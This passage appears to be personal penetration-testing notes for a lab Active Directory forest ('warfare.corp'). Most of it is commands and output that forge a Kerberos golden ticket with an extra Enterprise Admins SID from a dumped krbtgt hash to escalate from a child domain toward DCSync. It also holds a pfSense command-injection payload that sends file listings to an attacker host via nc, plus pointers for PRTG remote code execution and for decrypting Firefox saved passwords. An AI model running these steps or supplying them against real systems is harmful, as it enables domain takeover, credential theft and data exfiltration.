[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e57dd34c1871b7a23fb17a77dec9b900:::

# SID of Child Domain 
impacket-lookupsid child.warfare.corp/corpmngr@cdc.child.warfare.corp | grep "Domain SID"
Password:

[*] Domain SID is: S-1-5-21-3754860944-83624914-1883974761

# SID of Parent Domain Admin Group 
impacket-lookupsid child.warfare.corp/corpmngr@dc01.warfare.corp | grep -B14 "Domain Admins"
Password:
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at dc01.warfare.corp
[*] StringBinding ncacn_np:dc01.warfare.corp[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3375883379-808943238-3239386119
498: WARFARE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: WARFARE\Administrator (SidTypeUser)
501: WARFARE\Guest (SidTypeUser)
502: WARFARE\krbtgt (SidTypeUser)
512: WARFARE\Domain Admins (SidTypeGroup)
519: WARFARE\Enterprise Admins (SidTypeGroup)

====> So we should take the SID AND AT THE END we add whatever Number of the group SID 

Here it 519 = S-1-5-21-3375883379-808943238-3239386119-519 (ADD THE SID NUMBER AT THE END)

# Puttting it all together 
impacket-ticketer -nthash e57dd34c1871b7a23fb17a77dec9b900 -domain child.warfare.corp -domain-sid S-1-5-21-3754860944-83624914-1883974761 -extra-sid S-1-5-21-3375883379-808943238-3239386119-519 hacker 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for child.warfare.corp/hacker
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in hacker.ccache

# Getting the TGT by a KDC 
impacket-getST -spn 'CIFS/dc01.warfare.corp' -k -no-pass child.warfare.corp/corpmngr -debug

# Better Way to do it : 
We will be using the AesKey instead of ntlm and using our compromised user this time , 
and specify that we want him to be in the Admin Group , for this we need the RID of our
user . 
===> impacket-lookupsid child.warfare.corp/corpmngr@cdc.child.warfare.corp
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at cdc.child.warfare.corp
[*] StringBinding ncacn_np:cdc.child.warfare.corp[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3754860944-83624914-1883974761
500: CHILD\Administrator (SidTypeUser)
....
1106: CHILD\corpmngr (SidTypeUser)
1107: CHILD\MGMT$ (SidTypeUser)

impacket-ticketer -aesKey "" -domain child.... -domain-sid "" -user-id 1106 -groups 512,513,516,518 -extra-sid "" corpmngr
                     
export KRB5CCNAME=corpmngr.ccache   
                           
# Now we generate the TGT : 
impacket-getST -spn 'CIFS/dc01.warfare.corp' -k -no-pass child.warfare.corp/corpmngr -debug
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Using Kerberos Cache: corpmngr.ccache
[+] Returning cached credential for KRBTGT/CHILD.WARFARE.CORP@CHILD.WARFARE.CORP
[+] Using TGT from cache
[+] Username retrieved from CCache: corpmngr
[*] Getting ST for user
[+] Trying to connect to KDC at CHILD.WARFARE.CORP:88
[+] Trying to connect to KDC at WARFARE.CORP:88
[*] Saving ticket in corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache

# Now we export it and do DCSYNC :

```

## Some Use cases :

### PFSense :

```bash
Username : can be anything 
Password : pfsense 
If we try to brute force and we get banned , we can use proxychains with socks5 to bypass
the ban . 
# If we have 2.1.4
use exploit/unix/http/pfsense_graph_injection_exec

#Command injection via Burp : 
?status_rrd_graph_img.php?database=queues;find+${HOME}|nc+10.10.10.5+9001
Now on our machine we do : nc -lnvp 9001 > filesystem.txt 
This will output the command result from the find command onto the filesystem.txt file . 
#The ${HOME} is just a / since the / is banned , we used that to bypass it 
Since we did env command  from earlier and we go that $HOME is / .

```

### PRTG Monitor :

```bash
# Location for PRTG Creds : 
%programdata%\Paessler\PRTG Network Monitor .(config files) 
Search for dbpassword or smt like that .  
# Authenticated Command Injection : 
exploit/windows/http/prtg_authenticated_rce : This will give us a Shell . 
```

### Firefox Priv Esc :

```bash
Location for Firefox Profiles :
On Windows : 
C:\Users\ops.controller\AppData\Roaming\Mozilla\Firefox\Profiles

Tool to decrypt the passwords :
https://github.com/unode/firefox_decrypt/

```

